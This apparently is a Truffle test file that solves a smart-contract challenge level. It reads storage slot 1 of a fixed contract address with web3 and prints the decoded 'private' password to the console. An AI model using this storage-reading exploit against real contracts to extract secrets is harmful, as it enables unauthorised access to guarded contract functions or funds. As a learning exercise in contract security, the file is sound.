

contract('Attack', async accounts => {

    it('attack 7', async () => {

        // showPassword: function (contractAddress, position) {
        //     web3.eth.getStorageAt(contractAddress, position)
        //         .then(function (hexPassword) {
        //             var password = web3.utils.hexToAscii(hexPassword);
        //             console.log(password);
        //         });
        // },

        const targetAddr = '0x43417A3e6D1BA9f680952adBFf712CAF7FA24A14';

        await web3.eth.getStorageAt(targetAddr, 1).then((hexPassword) => {
            let password = web3.utils.hexToAscii(hexPassword);
            console.log(password);
        });

    });
});